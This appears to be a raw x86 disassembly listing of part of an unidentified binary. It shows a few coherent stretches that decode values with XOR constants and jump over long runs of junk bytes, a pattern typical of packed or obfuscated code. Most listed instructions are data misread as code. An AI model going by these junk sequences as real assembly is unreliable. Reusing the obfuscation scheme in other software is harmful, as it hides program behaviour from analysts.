  414f62:	mov    esi,0x5df8e7f2
  414f67:	imul   ecx,ebx,0x1
  414f6a:	scas   eax,DWORD PTR es:[edi]
  414f6b:	aaa    
  414f6c:	jbe    0x414efb
  414f6e:	jne    0x414fc5
  414f70:	out    dx,eax
  414f71:	test   dh,bl
  414f73:	xchg   BYTE PTR [ebp-0x641a0bab],bl
  414f79:	pop    ds
  414f7a:	outs   dx,DWORD PTR ds:[esi]
  414f7b:	dec    esp
  414f7c:	push   ecx
  414f7d:	repnz out 0xf9,eax
  414f80:	leave  
  414f81:	addr16 mov al,ds:0x6fa6
  414f85:	outs   dx,DWORD PTR ds:[esi]
  414f86:	out    dx,al
  414f87:	popf   
  414f88:	(bad)  
  414f89:	sar    esi,1
  414f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f8c:	daa    
  414f8d:	jecxz  0x414f10
  414f8f:	ss dec esi
  414f91:	sar    BYTE PTR [esi+eax*8-0x7acaede9],cl
  414f98:	call   0xf09d98fb
  414f9d:	add    BYTE PTR [eax+0x20b8f300],dh
  414fa3:	sbb    dh,ah
  414fa5:	xchg   edx,eax
  414fa6:	push   ebp
  414fa7:	inc    edx
  414fa8:	sbb    eax,0x891cc1e0
  414fad:	pop    edx
  414fae:	jnp    0x415006
  414fb0:	retf   0x2cc0
  414fb3:	fnsave [ecx-0x34]
  414fb6:	mov    ebp,0x67ff81c5
  414fbb:	fidiv  DWORD PTR [ebx+0x7b4b6296]
  414fc1:	mov    dh,0x71
  414fc3:	pop    ebx
  414fc4:	js     0x414f73
  414fc6:	inc    eax
  414fc7:	xor    ebp,DWORD PTR [ecx-0x7f389810]
  414fcd:	add    al,0x21
  414fcf:	in     eax,0x78
  414fd1:	add    eax,0x4511a0a6
  414fd6:	icebp  
  414fd7:	jnp    0x414f61
  414fd9:	pop    esp
  414fda:	mov    BYTE PTR [esi],dl
  414fdc:	inc    esp
  414fdd:	mov    ds:0xab05bf5b,al
  414fe2:	or     BYTE PTR [edi-0x69],ah
  414fe5:	mov    eax,0xfd8576fb
  414fea:	xchg   ebp,eax
  414feb:	adc    cl,ch
  414fed:	dec    edi
  414fee:	mov    ecx,0x1e684a45
  414ff3:	aas    
  414ff4:	mov    dh,0x16
  414ff6:	push   eax
  414ff7:	nop
  414ff8:	out    dx,eax
  414ff9:	add    edx,eax
  414ffb:	dec    esp
  414ffc:	cmp    eax,0xf4f24f4d
  415001:	add    BYTE PTR [ecx-0x288de08e],0xc9
  415008:	lods   al,BYTE PTR ds:[esi]
  415009:	cmc    
  41500a:	mov    cs,WORD PTR [esi]
  41500c:	lods   eax,DWORD PTR ds:[esi]
  41500d:	dec    ebp
  41500e:	push   0xffffffe7
  415010:	(bad)  
  415011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415012:	adc    cl,BYTE PTR [ebx+0x1c]
  415015:	xchg   esi,eax
  415016:	sbb    BYTE PTR [ebp+eiz*4+0x28],0x24
  41501b:	jmp    0x4552c915
  415020:	outs   dx,BYTE PTR ds:[esi]
  415021:	mov    cl,0x84
  415023:	inc    ebx
  415024:	bound  ebp,QWORD PTR [esp+esi*2]
  415027:	aaa    
  415028:	dec    ebx
  415029:	gs mov ebp,0x80590579
  41502f:	pop    eax
  415030:	pusha  
  415031:	sbb    DWORD PTR [ecx+ebx*1-0x2a],eax
  415035:	cmp    DWORD PTR [edi-0x80],ebx
  415038:	pop    eax
  415039:	adc    al,0x6d
  41503b:	jg     0x41501a
  41503d:	sub    ecx,DWORD PTR [esi+0x72]
  415040:	data16 (bad) 
  415043:	mov    esp,0xfeed8e4f
  415048:	and    al,0x92
  41504a:	ins    DWORD PTR es:[edi],dx
  41504b:	jae    0x41501a
  41504d:	stos   BYTE PTR es:[edi],al
  41504e:	and    eax,0x574a116b
  415053:	outs   dx,BYTE PTR ds:[esi]
  415054:	mov    eax,ds:0x52d45512
  415059:	stos   DWORD PTR es:[edi],eax
  41505a:	jg     0x415065
  41505c:	loope  0x415043
  41505e:	mov    bl,BYTE PTR [ebx-0x1]
  415061:	mov    bh,0xe5
  415063:	and    ecx,DWORD PTR [ecx-0x5c]
  415066:	iret   
  415067:	idiv   BYTE PTR [esi+0x32]
  41506a:	sbb    BYTE PTR [ebx+edx*1-0x53],0x8a
  41506f:	sub    BYTE PTR [esi-0x45860139],ah
  415075:	pusha  
  415076:	xor    ch,al
  415078:	add    al,0xf
  41507a:	adc    BYTE PTR [edx],cl
  41507c:	jno    0x41505f
  41507e:	nop
  41507f:	imul   dh
  415081:	xchg   ebp,eax
  415082:	dec    ebp
  415084:	cs sub edi,0xffffffbd
  415088:	clc    
  415089:	mov    eax,0xe77db415
  41508e:	mov    esp,0x60cf2418
  415093:	sbb    BYTE PTR [esi+0x764e4e1f],dl
  415099:	adc    ah,BYTE PTR [ebx+edx*1+0x7f561b49]
  4150a0:	xchg   BYTE PTR [ebx+0x78],cl
  4150a3:	pop    es
  4150a4:	push   ss
  4150a5:	jbe    0x4150bf
  4150a7:	lods   al,BYTE PTR ds:[esi]
  4150a8:	clc    
  4150a9:	adc    dh,bl
  4150ab:	sub    DWORD PTR [esi+0x51],ebx
  4150ae:	stos   DWORD PTR es:[edi],eax
  4150af:	punpckhwd mm7,QWORD PTR [edx]
  4150b2:	mov    cl,0xcb
  4150b4:	push   eax
  4150b5:	sub    ebp,DWORD PTR [edi-0x70314ff7]
  4150bb:	hlt    
  4150bc:	rcr    dh,cl
  4150be:	cli    
  4150bf:	and    eax,0x5945e9ca
  4150c4:	mov    dh,0x2e
  4150c6:	adc    edx,DWORD PTR [edx+0x47]
  4150c9:	mov    BYTE PTR [edx],ch
  4150cb:	(bad)  
  4150cc:	out    dx,eax
  4150cd:	jno    0x996d5706
  4150d3:	imul   edx,DWORD PTR [edi],0xc30bbfbc
  4150d9:	mov    bh,0xdc
  4150db:	inc    esi
  4150dc:	lods   al,BYTE PTR ds:[esi]
  4150dd:	jecxz  0x4150c8
  4150df:	or     al,0xc8
  4150e1:	pop    edx
  4150e2:	in     eax,0x60
  4150e4:	mov    dl,0xb7
  4150e6:	jle    0x41512c
  4150e8:	retf   
  4150e9:	dec    esi
  4150ea:	dec    ebx
  4150eb:	xor    ecx,DWORD PTR [edi-0x4b]
  4150ee:	pop    ecx
  4150ef:	dec    edi
  4150f0:	jg     0x4150e6
  4150f2:	or     ch,BYTE PTR [ecx-0x17941b3]
  4150f8:	xchg   esp,eax
  4150f9:	sar    DWORD PTR [esi+0x7786a0c1],0xf7
  415100:	sbb    al,0x3
  415102:	push   ecx
  415103:	mov    eax,ds:0x43df8542
  415108:	dec    ebp
  415109:	xchg   edx,eax
  41510a:	aaa    
  41510b:	xchg   esp,eax
  41510c:	out    0x2c,eax
  41510e:	push   ebx
  41510f:	fwait
  415110:	test   BYTE PTR [edi-0xfc43f33],0xaf
  415117:	adc    bl,BYTE PTR [eax]
  415119:	and    ah,BYTE PTR [edi+0x11648197]
  41511f:	pop    eax
  415120:	pop    ebx
  415121:	and    bl,BYTE PTR [edi]
  415123:	popf   
  415124:	fimul  DWORD PTR [edi+0x7c8c1cb]
  41512a:	cmp    al,0x11
  41512c:	bound  eax,QWORD PTR [esi+eax*1-0x7c]
  415130:	retf   
  415131:	arpl   WORD PTR [ebx+0x4c81bf11],dx
  415137:	les    ebx,FWORD PTR [edi+0x14de8bd1]
  41513d:	adc    al,0x5f
  41513f:	sar    DWORD PTR [ebx],0xb0
  415142:	daa    
  415143:	jbe    0x415162
  415145:	sbb    eax,0xefc08205
  41514a:	cs adc ebp,ecx
  41514d:	adc    eax,0xc0589a38
  415152:	dec    ecx
  415153:	mov    cl,0xe
  415155:	pop    eax
  415156:	retf   
  415157:	aad    0x2c
  415159:	xchg   ebp,eax
  41515a:	sub    DWORD PTR [ebx-0x4a580188],eax
  415160:	jbe    0x41518f
  415162:	jmp    0x638e:0xff9be73f
  415169:	rol    bl,1
  41516b:	(bad)  
  41516c:	pop    esp
  41516d:	sub    ch,al
  41516f:	sbb    cl,ch
  415171:	punpckldq mm1,DWORD PTR [eax-0x4a]
  415175:	rcl    BYTE PTR [edi+edi*4],cl
  415178:	jnp    0x415147
  41517a:	push   ebp
  41517b:	hlt    
  41517c:	adc    ch,0xce
  41517f:	sub    esp,eax
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fstp   DWORD PTR [edx]
  4151a5:	scas   eax,DWORD PTR es:[edi]
  4151a6:	retf   0xedb2
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	stos   DWORD PTR es:[edi],eax
  4151b1:	add    eax,0x125b841c
  4151b6:	in     eax,0x91
  4151b8:	sbb    edx,DWORD PTR [eax]
  4151ba:	pop    ebx
  4151bb:	std    
  4151bc:	aas    
  4151bd:	jns    0x415228
  4151bf:	push   ss
  4151c0:	mov    ah,0x19
  4151c2:	retf   0x5427
  4151c5:	outs   dx,BYTE PTR ds:[esi]
  4151c6:	cmp    al,0xa3
  4151c8:	neg    BYTE PTR [edx]
  4151ca:	rol    BYTE PTR [ebp-0x137c2fed],0xb2
  4151d1:	xor    bh,BYTE PTR [ebx+0x60]
  4151d4:	std    
  4151d5:	jmp    0x8962:0x4cd76238
  4151dc:	mov    dl,0x8
  4151de:	js     0x415219
  4151e0:	jne    0x4151db
  4151e2:	out    0x6,al
  4151e4:	(bad)  
  4151e5:	adc    al,0xa2
  4151e7:	mov    WORD PTR [ecx+0x51],?
  4151ea:	mov    ds,ebp
  4151ec:	and    BYTE PTR [eax+0x41],0x21
  4151f0:	das    
  4151f1:	nop
  4151f2:	les    edi,FWORD PTR [ebx+esi*2-0x6]
  4151f6:	daa    
  4151f7:	fdivr  QWORD PTR [edi+0x5f079bd9]
  4151fd:	setl   al
  415200:	hlt    
  415201:	mov    edi,0x4c681ab
  415206:	mov    bl,0x91
  415208:	popf   
  415209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41520a:	xchg   edi,eax
  41520b:	mov    bh,0x4
  41520d:	jmp    0x6c42:0x65d69e48
  415214:	cmp    ebp,DWORD PTR [edi+0x23]
  415217:	cmc    
  415218:	push   es
  415219:	lea    ecx,[edi-0x53]
  41521c:	cmp    esp,0x74
  41521f:	mov    bl,0xc2
  415221:	jecxz  0x4151a8
  415223:	dec    ebx
  415224:	xchg   edx,eax
  415225:	fcomi  st,st(7)
  415227:	jmp    0x41525f
  415229:	fs mov ah,0xd8
  41522c:	popa   
  41522d:	rol    BYTE PTR [ecx-0x53],cl
  415230:	into   
  415231:	mov    bl,0x58
  415233:	sub    BYTE PTR [edx-0x1d7ee633],bl
  415239:	xchg   ecx,esp
  41523b:	cli    
  41523c:	mov    eax,0xe5f880e8
  415241:	enter  0xff72,0x20
  415245:	jbe    0x4152bf
  415247:	mov    ecx,0x7a43d00
  41524c:	clc    
  41524d:	cmp    BYTE PTR [esi+eax*1],ch
  415250:	or     DWORD PTR [edi-0x1be6c55b],edx
  415256:	shr    DWORD PTR [edi-0x199d2da6],0x3d
  41525d:	mov    al,0x24
  41525f:	in     al,0x97
  415261:	pop    edi
  415262:	jle    0x415225
  415264:	sbb    DWORD PTR ds:0xff020fe5,0xde1fed8c
  41526e:	sub    al,BYTE PTR [ebx-0x73]
  415271:	test   al,0x3
  415273:	sahf   
  415274:	pop    esp
  415275:	jmp    0x415219
  415277:	cmp    edx,DWORD PTR [ecx+0x57]
  41527a:	cs stc 
  41527c:	and    al,BYTE PTR [esi-0x3e]
  41527f:	out    0xd7,al
  415281:	push   esp
  415282:	add    al,0xfd
  415284:	pop    eax
  415285:	mov    WORD PTR [ecx+0x4a3ec7a0],ss
  41528b:	idiv   edi
  41528d:	lock push ss
  41528f:	sbb    eax,0x1a2fa2a6
  415294:	cmp    eax,0x14817d4f
  415299:	iret   
  41529a:	adc    DWORD PTR [esi+0x238605b1],0xaf62a0e4
  4152a4:	fld    DWORD PTR [ecx]
  4152a6:	cmp    BYTE PTR [edx],bh
  4152a8:	mov    ds:0x5a1eb230,al
  4152ad:	hlt    
  4152ae:	mov    esi,0xf7d9a2f7
  4152b3:	cmp    bh,0x16
  4152b6:	dec    ecx
  4152b7:	jae    0x4152ee
  4152b9:	scas   al,BYTE PTR es:[edi]
  4152ba:	mov    ds:0x7bc6c80d,eax
  4152bf:	int3   
  4152c0:	iret   
  4152c1:	call   0xd3eb:0x465dbb3
  4152c8:	ss je  0x4152d4
  4152cb:	or     ch,BYTE PTR [edx-0x37cf68a9]
  4152d1:	lds    esi,FWORD PTR [esi+eax*4]
  4152d4:	jmp    0xb6e2:0x6f73d46b
  4152db:	shr    edi,0x7a
  4152de:	jns    0x4152b7
  4152e0:	pop    esp
  4152e1:	repz call FWORD PTR [edx+0x2a71178]
  4152e8:	jle    0x41527e
  4152ea:	sub    al,0x1b
  4152ec:	rcl    edx,cl
  4152ee:	pop    edx
  4152ef:	dec    ebx
  4152f0:	ins    DWORD PTR es:[edi],dx
  4152f1:	test   eax,0xd8268725
  4152f6:	and    eax,0x1fe3c4f7
  4152fb:	xor    al,BYTE PTR [edi-0x3397b6c9]
  415301:	fcomip st,st(1)
  415303:	mov    dl,0x4d
  415305:	bound  ebp,QWORD PTR [esi]
  415307:	jge    0x415325
  415309:	add    BYTE PTR [ecx-0x7b479cad],al
  41530f:	jl     0x41537d
  415311:	inc    esp
  415312:	inc    eax
  415313:	xchg   BYTE PTR [esi+edx*2-0x14275167],al
  41531a:	xchg   esp,eax
  41531b:	rol    DWORD PTR [edx+eiz*1],cl
  41531e:	mov    DWORD PTR [ebx+0x7060cf6],edi
  415324:	aam    0xd8
  415326:	push   0x4019d3c2
  41532b:	and    eax,0xb258f969
  415330:	push   ss
  415331:	push   ecx
  415332:	inc    ebp
  415333:	lea    esp,[edx-0x41a24b39]
  415339:	mov    cl,0x63
  41533b:	stos   DWORD PTR es:[edi],eax
  41533c:	or     eax,DWORD PTR [ecx+esi*8-0x2850e8d8]
  415343:	fstp   DWORD PTR [ecx]
  415345:	xlat   BYTE PTR ds:[ebx]
  415346:	mov    dl,0x3d
  415348:	jge    0x415322
  41534a:	shr    BYTE PTR [ecx-0x79],0x8c
  41534e:	dec    ebp
  41534f:	mov    ah,0x31
  415351:	in     eax,dx
  415352:	inc    esp
  415353:	iret   
  415354:	and    al,0xd8
  415356:	cmp    edi,edi
  415358:	sbb    DWORD PTR [eax-0xb535b6d],ebp
  41535e:	(bad)  
  41535f:	pop    esp
  415360:	jbe    0x415349
  415362:	out    0x41,al
  415364:	sbb    BYTE PTR [eax],dh
  415366:	(bad)  
  415367:	in     al,dx
  415368:	sbb    DWORD PTR [ecx],ebx
  41536a:	xchg   ebp,eax
  41536b:	nop
  41536c:	fcom   DWORD PTR [edx+eiz*1+0x2a]
  415370:	and    eax,0x520164f7
  415375:	jne    0x415365
  415377:	cmp    eax,0x9c13e965
  41537c:	loopne 0x4153c1
  41537e:	jle    0x4153ba
  415380:	jb     0x4153d2
  415382:	push   ebx
  415383:	shr    BYTE PTR [eax],0xb4
  415386:	test   al,0x14
  415388:	dec    esi
  415389:	outs   dx,DWORD PTR ds:[esi]
  41538a:	stos   DWORD PTR es:[edi],eax
  41538b:	cld    
  41538c:	xor    cl,ch
  41538e:	pop    ebx
  41538f:	push   edi
  415390:	(bad)
  415393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415394:	popa   
  415395:	mov    edi,ebp
  415397:	ja     0x4153a0
  415399:	inc    edx
  41539a:	nop
  41539b:	pop    ds
  41539c:	pop    esp
  41539d:	lods   eax,DWORD PTR ds:[esi]
  41539e:	popf   
  41539f:	dec    edi
  4153a0:	hlt    
  4153a1:	xchg   ebx,eax
  4153a2:	sub    esp,eax
  4153a4:	clc    
  4153a5:	ror    BYTE PTR [eax],1
  4153a7:	or     BYTE PTR cs:[esi+0xc],ah
  4153ab:	retf   0x66fa
  4153ae:	sub    al,0xec
  4153b0:	pusha  
  4153b1:	ret    
  4153b2:	mov    ds:0x7975c385,eax
  4153b7:	sbb    ecx,DWORD PTR [eax+0x294e32fc]
  4153bd:	mov    edx,0x52f9ac22
  4153c2:	cwde   
  4153c3:	leave  
  4153c4:	push   esi
  4153c5:	and    al,0x61
  4153c7:	adc    dl,BYTE PTR [esi+0x7c832c71]
  4153cd:	jo     0x41540d
  4153cf:	pusha  
  4153d0:	mov    edx,0x544f0aca
  4153d5:	sub    ebx,ecx
  4153d7:	xchg   DWORD PTR [esi-0x33],ebp
  4153da:	pop    es
  4153db:	sahf   
  4153dc:	mov    dl,0x63
  4153de:	out    dx,eax
  4153df:	pop    ss
  4153e0:	aas    
  4153e1:	ret    
  4153e2:	daa    
  4153e3:	fistp  DWORD PTR [eax+edx*8+0x2e]
  4153e7:	push   eax
  4153e8:	imul   edx,DWORD PTR [edi+0x52],0x99296d21
  4153ef:	in     al,dx
  4153f0:	ds (bad) 
  4153f2:	out    dx,al
  4153f3:	mov    eax,ds:0x20cef30f
  4153f8:	mov    al,ds:0x47612f7
  4153fd:	xchg   esp,eax
  4153fe:	mov    bl,0xbd
  415400:	call   0xf29d7314
  415405:	daa    
  415406:	push   es
  415407:	dec    ecx
  415408:	out    dx,al
  415409:	mov    eax,0xb1725887
  41540e:	fcom   DWORD PTR [ebx]
  415410:	repnz dec esi
  415412:	lahf   
  415413:	stos   DWORD PTR es:[edi],eax
  415414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415415:	fidiv  WORD PTR [edi-0x70]
  415418:	in     al,dx
  415419:	ss pop bx
  41541c:	sub    cl,BYTE PTR [edx-0x7b]
  41541f:	push   ebx
  415420:	into   
  415421:	cmp    DWORD PTR [eax-0x63a63d50],esp
  415427:	pushf  
  415428:	xchg   DWORD PTR [ebx-0x11],edi
  41542b:	stos   DWORD PTR es:[edi],eax
  41542c:	mov    ds:0x5591a7ba,eax
  415431:	push   eax
  415432:	ror    BYTE PTR [ecx+0x49dd21bb],cl
  415438:	sbb    al,0x8b
  41543a:	sub    al,0x9a
  41543c:	cwde   
  41543d:	xor    esp,DWORD PTR [edi-0x596a154]
  415443:	push   cs
  415444:	lods   eax,DWORD PTR ds:[esi]
  415445:	addr16 dec ebp
  415447:	mov    ebp,0x5aad1f7e
  41544c:	pop    esp
  41544d:	or     al,0x16
  41544f:	inc    ecx
  415450:	fidivr WORD PTR [edx+0x2318527]
  415456:	(bad)  
  415457:	dec    esp
  415458:	xchg   edi,eax
  415459:	in     eax,dx
  41545a:	imul   BYTE PTR [edi-0x43]
  41545d:	mov    edx,0xb5735ae1
  415462:	jle    0x415433
  415464:	jo     0x415425
  415466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415467:	xchg   edx,eax
  415468:	and    DWORD PTR [esi+0x5dd18322],edx
  41546e:	pop    edi
  41546f:	ds pusha 
  415471:	add    DWORD PTR [ecx+0x712a89dd],edx
  415477:	add    eax,edx
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x6e
  4154c8:	xchg   ecx,eax
  4154c9:	xlat   BYTE PTR ss:[ebx]
  4154cb:	add    bh,BYTE PTR ss:[edi+0x70]
  4154cf:	mov    ecx,0x870707e
  4154d4:	ds xchg esp,eax
  4154d6:	jno    0x415465
  4154d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154d9:	setae  BYTE PTR [edx-0xe839484]
  4154e0:	sbb    esi,esi
  4154e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154e3:	or     eax,0x9842dd94
  4154e8:	icebp  
  4154e9:	dec    ebp
  4154ea:	ds int 0x4
  4154ed:	movaps XMMWORD PTR [esi],xmm7
  4154f0:	ficomp DWORD PTR [ebx+eiz*8+0x2e]
  4154f4:	cmp    DWORD PTR [ebx],ebx
  4154f6:	sub    ecx,DWORD PTR [ebp-0xd]
  4154f9:	add    ch,BYTE PTR [esi]
  4154fb:	add    BYTE PTR [edi-0x3f],dl
  4154fe:	fnstenv [ebx]
  415500:	cmp    eax,0xed9e08
  415505:	imul   esi,DWORD PTR [esi+0x32],0xffffffef
  415509:	dec    esi
  41550a:	push   esp
  41550b:	les    ebx,FWORD PTR [eax]
  41550d:	ds xchg ecx,eax
  41550f:	mov    ch,0x2d
  415511:	stos   DWORD PTR es:[edi],eax
  415512:	lock add eax,0xe903b45b
  415518:	xor    eax,0xddfd23a6
  41551d:	dec    ecx
  41551e:	push   ss
  41551f:	sbb    cl,BYTE PTR [edi]
  415521:	(bad)  
  415522:	ins    BYTE PTR es:[edi],dx
  415523:	(bad)  
  415524:	fimul  DWORD PTR fs:[edx]
  415527:	dec    edi
  415528:	mov    ds:0x5765f401,al
  41552d:	mov    dl,0x24
  41552f:	inc    ebp
  415530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415531:	mov    eax,0xbd6637c7
  415536:	mov    ds:0x5b9178f6,al
  41553b:	pop    esi
  41553c:	addr16 rcr bl,1
  41553f:	mov    edi,0x38d97921
  415544:	push   edx
  415545:	or     eax,0x94ca104b
  41554a:	sti    
  41554b:	vpaddb xmm1,xmm5,xmm2
  41554f:	jl     0x4154d1
  415551:	xchg   BYTE PTR [esi],bh
  415553:	fcmovbe st,st(5)
  415555:	sub    BYTE PTR [esi-0x2f34b528],ah
  41555b:	gs int 0x4e
  41555e:	sbb    ebx,DWORD PTR [ebx-0x23]
  415561:	mov    BYTE PTR [esi+0x1a],ch
  415564:	dec    edi
  415565:	imul   eax,DWORD PTR [ebx+0x73],0xa61ecd42
  41556c:	pop    ebp
  41556d:	push   0xffffffa5
  41556f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415570:	inc    esi
  415571:	imul   eax,DWORD PTR [esi],0xffffffae
  415574:	xchg   ecx,eax
  415575:	(bad)  
  415576:	cld    
  415577:	jae    0x415582
  415579:	call   0xb2e41b2
  41557e:	pop    ebp
  41557f:	add    eax,0xdf0b84cd
  415584:	xor    eax,0x7854d7ca
  415589:	sub    ah,0x76
  41558c:	mov    eax,ds:0x5a77b824
  415591:	out    0x1e,al
  415593:	adc    BYTE PTR [ecx+0x6f3641e8],al
  415599:	sbb    eax,0xa0062fbb
  41559e:	mov    dh,0xa8
  4155a0:	jmp    FWORD PTR [edi+edx*1-0x39a85128]
  4155a7:	xor    eax,0xcc2fff1
  4155ac:	adc    ah,BYTE PTR [esi-0x21c05cf]
  4155b2:	jle    0x4155d8
  4155b4:	std    
  4155b5:	adc    dl,BYTE PTR [esi]
  4155b7:	in     eax,dx
  4155b8:	push   esp
  4155b9:	xchg   ebx,eax
  4155ba:	mov    eax,ds:0x1564736a
  4155bf:	pop    es
  4155c0:	inc    eax
  4155c1:	push   0xffffffd7
  4155c3:	leave  
  4155c4:	mul    ch
  4155c6:	sbb    eax,0xcb4a7ea0
  4155cb:	xlat   BYTE PTR ds:[ebx]
  4155cc:	jp     0x415581
  4155ce:	jnp    0x415638
  4155d0:	sub    esi,DWORD PTR [edx]
  4155d2:	fisttp DWORD PTR [ebx]
  4155d4:	sub    dl,al
  4155d6:	mov    bh,0xdd
  4155d8:	pop    ebp
  4155d9:	(bad)  
  4155da:	in     eax,0x7f
  4155dc:	arpl   WORD PTR [eax+0x69ba223],sp
  4155e2:	or     ebx,DWORD PTR [edx]
  4155e4:	icebp  
  4155e5:	jmp    0xd6de:0xfb40e10
  4155ec:	xor    bl,BYTE PTR [edi+ebx*2]
  4155ef:	pop    ds
  4155f0:	dec    ebp
  4155f1:	outs   dx,DWORD PTR ds:[esi]
  4155f2:	fidivr WORD PTR [ebx+0x76]
  4155f5:	aas    
  4155f6:	cmp    ch,bl
  4155f8:	jne    0x4155c2
  4155fa:	xchg   DWORD PTR [eax],ecx
  4155fc:	mov    gs,WORD PTR [ecx+0x54]
  4155ff:	test   BYTE PTR [ebx+edx*2-0x1b],cl
  415603:	pop    eax
  415604:	cmp    eax,0xc12a8d4c
  415609:	or     ecx,0xa280f136
  41560f:	test   eax,0xe07bf2d5
  415614:	bound  ebp,QWORD PTR [edx-0xa]
  415617:	outs   dx,BYTE PTR ds:[esi]
  415618:	retf   
  415619:	jnp    0x4155a9
  41561b:	mov    ah,0x77
  41561d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41561e:	das    
  41561f:	push   esp
  415620:	or     bl,dh
  415622:	test   DWORD PTR [ecx+0x760952bb],edi
  415628:	mov    ch,0xed
  41562a:	popf   
  41562b:	mov    ecx,0x535a2a68
  415630:	mov    cs,WORD PTR [ecx+0x5b]
  415633:	xchg   edx,eax
  415634:	sub    DWORD PTR [edi-0x5b],ebp
  415637:	push   edx
  415638:	xor    ah,BYTE PTR [ebp-0x589df6f0]
  41563e:	in     al,dx
  41563f:	out    0xf5,al
  415641:	mov    dl,0x74
  415643:	sti    
  415644:	pop    edi
  415645:	and    ah,BYTE PTR [ebp-0x63bbcdeb]
  41564b:	cmp    BYTE PTR [esi],bl
  41564d:	jmp    0x41565a
  41564f:	aam    0x54
  415651:	sub    al,0xea
  415653:	retf   0x3864
  415656:	mov    esi,0x1c9a1977
  41565b:	inc    edx
  41565c:	pop    ds
  41565d:	or     eax,DWORD PTR [esi+ecx*2]
  415660:	cmp    eax,0x74c4460a
  415665:	in     eax,dx
  415666:	int    0x33
  415668:	mul    BYTE PTR [eax+0x554a1e24]
  41566e:	test   BYTE PTR [ebp+0x40d76363],0xfa
  415675:	fnsave [edx+0x59]
  415678:	sbb    DWORD PTR [ebp-0x5c],0x62
  41567c:	sub    al,0x43
  41567e:	mov    bh,0x4
  415680:	xchg   esi,eax
  415681:	jmp    0x9a78:0x23363728
  415688:	(bad)
  41568c:	bswap  ebx
  41568e:	adc    al,0x4e
  415690:	scas   al,BYTE PTR es:[edi]
  415691:	jnp    0x4156d1
  415693:	xor    BYTE PTR [eax-0x250ba999],al
  415699:	mov    ah,0x7
  41569b:	jl     0x41562c
  41569d:	leave  
  41569e:	xor    edx,ecx
  4156a0:	sub    dl,bl
  4156a2:	pop    es
  4156a3:	cdq    
  4156a4:	mov    edx,0x4cace5d0
  4156a9:	xor    eax,0x5ecca0ae
  4156ae:	loop   0x41570a
  4156b0:	out    0x76,eax
  4156b2:	cld    
  4156b3:	imul   DWORD PTR [ebx+0x204cd3f9]
  4156b9:	jg     0x415667
  4156bb:	adc    eax,0xd6d56ca
  4156c0:	ret    0x610a
  4156c3:	icebp  
  4156c4:	or     DWORD PTR [esi-0x74e256f1],esi
  4156ca:	pop    ebp
  4156cb:	stos   BYTE PTR es:[edi],al
  4156cc:	cmp    DWORD PTR ds:0x462fe785,ebp
  4156d2:	aaa    
  4156d3:	mov    ds:0xb703e743,al
  4156d8:	sbb    DWORD PTR [eax],edx
  4156da:	xchg   ebp,eax
  4156db:	jmp    0x6b7b4f2f
  4156e0:	and    BYTE PTR [esi],ch
  4156e2:	jmp    0x1506:0x64069be3
  4156e9:	mov    BYTE PTR [edx+0x27e212a4],bh
  4156ef:	pop    esp
  4156f0:	xchg   ecx,eax
  4156f1:	xchg   DWORD PTR [ebx+ecx*2+0x281da897],ebp
  4156f8:	inc    ecx
  4156f9:	in     al,dx
  4156fa:	lods   al,BYTE PTR ds:[esi]
  4156fb:	(bad)  
  4156fc:	xor    al,0xe4
  4156fe:	and    eax,0x9f1cb4d2
  415703:	add    eax,0xac9fab44
  415708:	arpl   WORD PTR [edx-0x57],dx
  41570b:	es call 0x2f84e23b
  415711:	sbb    DWORD PTR [esi-0xbdfab57],esp
  415717:	fisttp WORD PTR [ebp-0x9]
  41571a:	lds    ebp,FWORD PTR [ebp-0x20a1a1a2]
  415720:	test   BYTE PTR [edi],0x7f
  415723:	dec    esi
  415724:	jecxz  0x41579b
  415726:	std    
  415727:	mov    ecx,0xd7cc339c
  41572c:	cmp    al,BYTE PTR [ecx-0x591c857]
  415732:	popf   
  415733:	rol    dh,0x48
  415736:	bound  ecx,QWORD PTR [ebx-0x3a87313]
  41573c:	push   edx
  41573d:	arpl   ax,bp
  41573f:	stos   BYTE PTR es:[edi],al
  415740:	inc    BYTE PTR [edi+eax*2+0x20]
  415744:	mov    dl,dl
  415746:	push   cs
  415747:	test   al,0x67
  415749:	xchg   al,al
  41574b:	jmp    0x41571c
  41574d:	nop
  41574e:	add    al,0x2b
  415750:	aaa    
  415751:	pusha  
  415752:	rcl    DWORD PTR [esi+esi*1+0x2edd0e9f],cl
  415759:	retf   0x9b93
